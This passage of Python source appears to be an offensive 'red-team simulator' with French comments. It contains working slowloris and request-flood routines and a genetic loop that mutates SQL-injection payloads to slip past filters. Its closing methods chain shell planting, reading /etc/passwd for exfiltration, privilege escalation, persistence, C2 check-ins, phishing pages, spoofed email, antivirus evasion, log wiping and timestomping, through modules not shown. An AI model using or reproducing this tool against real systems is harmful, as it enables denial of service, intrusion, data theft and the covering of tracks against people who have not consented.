                    "path": name, "target": f"{target[0]}:{target[1]}",
                    "tls": tls, **r.to_dict(),
                })
            except Exception as e:
                errors += 1
                details.append({"path": name, "error": str(e)})
            finally:
                with self._target_lock:
                    self.target, self.use_tls = original_target, original_tls

        rcs = [d.get("response_code") for d in details if d.get("response_code") is not None]
        extra = {"consistent": (len(set(rcs)) <= 1) if rcs else None}
        return self._build_report("policy_consistency", "Cohérence de politique multi-chemin",
                                  details, evasions, blocked, errors, extra=extra)

    def test_slowloris(self, connections: int = 15, hold_seconds: float = 3.0,
                       header_interval: float = 1.0) -> VectorReport:
        """Slowloris : on vérifie que le serveur NE ferme PAS la connexion."""
        sockets_kept: List[socket.socket] = []
        errors = 0
        for _ in range(connections):
            try:
                s = self._connect(timeout=1.0)
                s.sendall(b"GET / HTTP/1.1\r\nHost: staging.local\r\n")
                sockets_kept.append(s)
            except OSError:
                errors += 1

        t0 = time.perf_counter()
        while time.perf_counter() - t0 < hold_seconds and sockets_kept:
            for s in list(sockets_kept):
                try:
                    s.sendall(f"X-Keep-{int(time.time())}: 1\r\n".encode())
                except OSError:
                    sockets_kept.remove(s)
            time.sleep(header_interval)

        # Une connexion "vivante" = toujours ouverte côté serveur (pas de RST/FIN).
        alive = 0
        for s in sockets_kept:
            try:
                s.settimeout(0.2)
                s.sendall(b"\r\n")
                try:
                    data = s.recv(64)
                    # Si on reçoit une réponse HTTP, le serveur a traité → pas slowloris
                    if not data:
                        alive += 0  # FIN reçu = fermé
                    else:
                        alive += 1
                except socket.timeout:
                    # Pas de réponse mais connexion toujours ouverte → slowloris réussi
                    alive += 1
            except OSError:
                pass
            finally:
                try:
                    s.close()
                except OSError:
                    pass

        evasions = alive
        blocked = connections - alive
        details = [{
            "connections_opened": connections,
            "alive_after_hold": alive,
            "errors": errors,
            "header_interval_s": header_interval,
        }]
        return self._build_report("slowloris", "Épuisement de threads Slowloris",
                                  details, evasions, blocked, errors, probes=connections)

    def test_velocity_burst(self, total_requests: int = 100, concurrency: int = 10,
                            timeout: float = 0.5) -> VectorReport:
        details: List[Dict[str, Any]] = []
        evasions = blocked = errors = 0
        latencies: List[float] = []

        def fire() -> AttackResult:
            return self._send_raw(DEFAULT_HTTP_PAYLOAD, timeout=timeout,
                                  vector="velocity_burst", record=False)

        start = time.perf_counter()
        with ThreadPoolExecutor(max_workers=concurrency) as ex:
            futs = [ex.submit(fire) for _ in range(total_requests)]
            for fut in as_completed(futs):
                try:
                    r = fut.result()
                except Exception as e:
                    errors += 1
                    details.append({"error": str(e)})
                    continue
                evasions += int(r.evasion_success)
                blocked += int(not r.evasion_success
                               and r.status in ("REFUSED", "TIMEOUT", "RESET"))
                errors += int(r.status.startswith("ERROR"))
                latencies.append(r.latency_ms)
                details.append({"status": r.status, "rc": r.response_code,
                                "evaded": r.evasion_success})
        duration = max(time.perf_counter() - start, 1e-6)

        extra = {
            "duration_sec": round(duration, 3),
            "throughput_rps": round(total_requests / duration, 1),
        }
        return self._build_report("velocity_burst", "Stress Rate-Limit",
                                  details, evasions, blocked, errors,
                                  probes=total_requests, latencies=latencies, extra=extra)

    def test_adaptive_mutation_loop(self, generations: int = 6,
                                    population_size: int = 6) -> VectorReport:
        base = (b"GET /search?q=SELECT%20*%20FROM%20users HTTP/1.1\r\n"
                b"Host: staging.local\r\n\r\n")
        population = [self._mutate(base, intensity=i) for i in range(population_size)]
        history: List[Dict[str, Any]] = []
        total_evasions = total_blocked = total_errors = total_probes = 0

        for gen in range(generations):
            scored: List[Tuple[float, bytes, AttackResult]] = []
            for ind in population:
                r = self._send_raw(ind, vector=f"evolution_g{gen}", record=False)
                fit = (
                    (2.0 if r.evasion_success else 0.0)
                    - (r.latency_ms / 1000.0)
                    + (1.0 / (1.0 + r.entropy_bpb))
                )
                scored.append((fit, ind, r))
                total_probes += 1
                total_evasions += int(r.evasion_success)
                total_blocked += int(not r.evasion_success
                                     and r.status in ("REFUSED", "TIMEOUT", "RESET"))
                total_errors += int(r.status.startswith("ERROR"))

            scored.sort(key=lambda x: x[0], reverse=True)
            survivors = [s[1] for s in scored[:max(2, population_size // 2)]]
            history.append({
                "generation": gen,
                "best_fitness": round(scored[0][0], 3),
                "best_signature": scored[0][2].payload_signature,
                "evasions": sum(1 for s in scored if s[2].evasion_success),
            })

            population = list(survivors)
            while len(population) < population_size:
                a, b = self.rng.sample(survivors, 2)
                child = a[:len(a) // 2] + b[len(b) // 2:]
                child = self._mutate(child, intensity=self.rng.randint(0, 2))
                population.append(child)
            time.sleep(0.03)

        details = [{"history": history}]
        return self._build_report("adaptive_mutation", "Évolution génétique de payloads",
                                  details, total_evasions, total_blocked, total_errors,
                                  probes=total_probes)

    def _mutate(self, payload: bytes, intensity: int = 1) -> bytes:
        """Mutations non triviales : case toggle, URL-encode, insertion de commentaires."""
        p = bytearray(payload)
        for _ in range(intensity + 1):
            op = self.rng.random()
            if not p:
                break
            if op < 0.3 and len(p) > 10:
                # Insérer un commentaire
                idx = self.rng.randint(5, len(p)-5)
                p[idx:idx] = b"/**/"
            elif op < 0.6 and len(p) > 5:
                # Changer la casse d'un caractère
                idx = self.rng.randint(0, len(p)-1)
                if chr(p[idx]).isalpha():
                    p[idx] ^= 0x20  # Toggle case
            elif op < 0.9 and len(p) > 5:
                # URL encode un caractère
                idx = self.rng.randint(0, len(p)-1)
                if 32 <= p[idx] <= 126 and p[idx] not in b"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789":
                    char = bytes([p[idx]])
                    encoded = quote(char.decode()).encode()
                    p[idx:idx+1] = encoded
        return bytes(p)

    def _run_simple_vectors(self, name: str, desc: str, vectors: List[Tuple[str, bytes]]) -> VectorReport:
        details, evasions, blocked, errors = [], 0, 0, 0
        latencies = []
        for vec_name, payload in vectors:
            r = self._send_raw(payload, vector=f"{name}::{vec_name}")
            evasions += int(r.evasion_success)
            blocked += int(not r.evasion_success and r.status in ("REFUSED", "TIMEOUT", "RESET"))
            errors += int(r.status.startswith("ERROR"))
            latencies.append(r.latency_ms)
            details.append({"vector": vec_name, **r.to_dict()})
        avg_lat = statistics.mean(latencies) if latencies else 0.0
        return self._build_report(name, desc, details, evasions, blocked, errors, latencies=latencies)

    def _build_report(self, name: str, desc: str, details: List[dict],
                      evasions: int, blocked: int, errors: int,
                      probes: Optional[int] = None,
                      latencies: Optional[List[float]] = None,
                      extra: Optional[dict] = None) -> VectorReport:
        if probes is None:
            probes = len(details)
        avg_lat = statistics.mean(latencies) if latencies else 0.0
        return VectorReport(
            name=name,
            description=desc,
            probes=probes,
            evasions=evasions,
            blocked=blocked,
            errors=errors,
            avg_latency=round(avg_lat, 3),
            details=details,
            extra=extra or {}
        )

    # -- Méthodes publiques pour accéder aux modules ------------------------
    def execute_exploitation(self):
        """Exécuter toutes les phases d'exploitation"""
        print("[*] Phase d'exploitation démarrée")
        
        # Ajouter un shell
        self.exploitation.add_shell()
        
        # Exfiltrer des données
        self.exploitation.exfiltrate_data("/etc/passwd")
        
        # Élever les privilèges
        self.exploitation.escalate_privileges()

    def execute_post_exploitation(self):
        """Exécuter toutes les phases de post-exploitation"""
        print("[*] Phase de post-exploitation démarrée")
        
        # Ajouter de la persistance
        self.post_exploitation.add_persistence()
        
        # Mouvement latéral
        self.post_exploitation.lateral_movement("192.168.1.100")

    def execute_c2_communication(self):
        """Exécuter la communication C2"""
        print("[*] Communication C2 démarrée")
        
        # Envoyer un check-in au serveur C2
        self.c2_module.send_to_c2('check_in', {'status': 'active'})

    def execute_auth_bypass(self):
        """Exécuter les tests de bypass d'authentification"""
        print("[*] Tests de bypass d'authentification démarrés")
        
        # Test JWT confusion
        fake_jwt = "eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"
        self.auth_bypass.jwt_confusion(fake_jwt)
        
        # Test OAuth abuse
        self.auth_bypass.oauth_abuse("https://example.com/callback", "client123")

    def execute_binary_exploits(self):
        """Exécuter les tests d'exploit binaire"""
        print("[*] Tests d'exploit binaire démarrés")
        
        # Test ROP
        self.binary_exploit.rop_exploit()
        
        # Test heap spray
        self.binary_exploit.heap_spray()
        
        # Test format string
        self.binary_exploit.format_string_exploit("%n%n%n")

    def execute_social_engineering(self):
        """Exécuter les tests de social engineering"""
        print("[*] Tests de social engineering démarrés")
        
        # Créer une page de phishing
        self.social_eng.create_phishing_page("login", "example.com")
        
        # Envoyer un email spoofé
        self.social_eng.send_spoofed_email("admin@example.com", "victim@example.com", 
                                          "Urgent Security Update", "Please click here...")

    def execute_protocol_coverage(self):
        """Exécuter les tests de couverture protocolaire"""
        print("[*] Tests de couverture protocolaire démarrés")
        
        # Test HTTP/2
        self.protocol_coverage.http2_test()
        
        # Test WebSocket
        self.protocol_coverage.websocket_test()
        
        # Test gRPC
        self.protocol_coverage.grpc_test()

    def execute_ad_tests(self):
        """Exécuter les tests AD/Kerberos/SMB/LDAP"""
        print("[*] Tests AD/Kerberos/SMB/LDAP démarrés")
        
        # Test Kerberos
        self.ad_testing.test_kerberos("dc.example.com")
        
        # Test SMB
        self.ad_testing.test_smb("192.168.1.100")
        
        # Test LDAP
        self.ad_testing.test_ldap("ldap://dc.example.com")

    def execute_av_evasion(self):
        """Exécuter les tests d'évasion antivirus"""
        print("[*] Tests d'évasion antivirus démarrés")
        
        # Obfusquer un payload
        payload = b"malicious_code_here"
        obfuscated = self.av_evasion.obfuscate_payload(payload)
        print(f"[+] Payload obfusqué: {len(obfuscated)} octets")
        
        # Pack un exécutable
        self.av_evasion.pack_executable("/tmp/test.exe")

    def execute_anti_forensics(self):
        """Exécuter les techniques anti-forensics"""
        print("[*] Techniques anti-forensics exécutées")
        
        # Effacer les logs
        self.anti_forensics.clear_logs()
        
        # Modifier les timestamps
        self.anti_forensics.timestomp(__file__, "/etc/passwd")


def main():
    parser = argparse.ArgumentParser(description="ATIBON Red-Team Simulator v5.0")
    parser.add_argument("--target-host", default="127.0.0.1", help="Hôte cible")
    parser.add_argument("--target-port", type=int, default=8080, help="Port cible")
    parser.add_argument("--use-tls", action="store_true", help="Utiliser TLS")
    parser.add_argument("--verbose", action="store_true", help="Mode verbeux")
    parser.add_argument("--i-have-authorization", required=True, 
                        help="Confirmation obligatoire d'autorisation")
    
    # Arguments pour les nouvelles fonctionnalités
    parser.add_argument("--exploit", action="store_true", help="Exécuter exploitation")
    parser.add_argument("--post-exploit", action="store_true", help="Exécuter post-exploitation")
    parser.add_argument("--c2", action="store_true", help="Activer communication C2")
    parser.add_argument("--auth-bypass", action="store_true", help="Test bypass auth")
    parser.add_argument("--binary-exploit", action="store_true", help="Test exploits binaires")
    parser.add_argument("--social-eng", action="store_true", help="Test social engineering")
    parser.add_argument("--protocol-cover", action="store_true", help="Test couverture protocolaire")
    parser.add_argument("--ad-test", action="store_true", help="Test AD/Kerberos/SMB/LDAP")
    parser.add_argument("--av-evasion", action="store_true", help="Test évasion AV")
    parser.add_argument("--anti-forensics", action="store_true", help="Exécuter anti-forensics")
    
    args = parser.parse_args()

    if not args.i_have_authorization:
        print("Erreur: --i-have-authorization est requis")
        sys.exit(1)

    agent = ActiveRedTeamAgent(
        target_host=args.target_host,
        target_port=args.target_port,
        use_tls=args.use_tls,
        verbose=args.verbose
    )

    print(f"[*] Début de l'audit sur {args.target_host}:{args.target_port}")
    
    # Exécuter les tests de fingerprinting
    fp = agent.fingerprint_target()
    print(f"[*] Fingerprinting terminé: {fp['target']}")
    
    # Exécuter les différentes phases selon les arguments
    if args.exploit:
        agent.execute_exploitation()
    
    if args.post_exploit:
        agent.execute_post_exploitation()
    
    if args.c2:
        agent.execute_c2_communication()
    
    if args.auth_bypass:
        agent.execute_auth_bypass()
    
    if args.binary_exploit:
        agent.execute_binary_exploits()
    
    if args.social_eng:
        agent.execute_social_engineering()
    
    if args.protocol_cover:
        agent.execute_protocol_coverage()
    
    if args.ad_test:
        agent.execute_ad_tests()
    
    if args.av_evasion:
        agent.execute_av_evasion()
    
    if args.anti_forensics:
        agent.execute_anti_forensics()

    print("[*] Audit terminé")


if __name__ == "__main__":
    main()